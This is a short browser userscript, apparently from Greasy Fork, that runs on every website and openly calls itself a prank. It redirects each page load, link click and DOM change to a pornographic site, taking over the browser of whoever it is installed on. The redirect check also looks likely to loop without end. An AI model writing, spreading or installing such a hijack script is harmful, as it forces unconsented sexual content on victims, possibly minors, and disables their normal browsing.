// ==UserScript==
// @name         Redirect All Clicks and URL Changes to www.pornhub.com (No Flash)
// @author       Kdroidwin
// @license      MIT
// @version      0.2
// @description  クリックやURL変更をwww.pornhub.comにリダイレクト いたずら用
// @author       You
// @match        *://*/*
// @grant        none
// @namespace https://greasyfork.org/users/1344730
// @downloadURL https://update.greasyfork.org/scripts/528324/Redirect%20All%20Clicks%20and%20URL%20Changes%20to%20wwwpornhubcom%20%28No%20Flash%29.user.js
// @updateURL https://update.greasyfork.org/scripts/528324/Redirect%20All%20Clicks%20and%20URL%20Changes%20to%20wwwpornhubcom%20%28No%20Flash%29.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // ページが読み込まれる前にリダイレクトを実行
    if (window.location.href !== 'https://www.pornhub.com') {
        window.location.replace('https://www.pornhub.com'); // これでページ遷移が瞬時に行われ、一瞬も表示されない
    }

    // クリックイベントをキャッチ
    document.addEventListener('click', function(event) {
        // リンクがクリックされた場合
        if (event.target.tagName.toLowerCase() === 'a') {
            event.preventDefault(); // デフォルトのリンク遷移をキャンセル
            window.location.replace('https://www.pornhub.com'); // www.pornhub.comにリダイレクト
        }
    });

    // URLが変更された場合もwww.pornhub.comにリダイレクト
    const observer = new MutationObserver(() => {
        if (window.location.href !== 'https://www.pornhub.com') {
            window.location.replace('https://www.pornhub.com');
        }
    });
    observer.observe(document, {subtree: true, childList: true});
})();
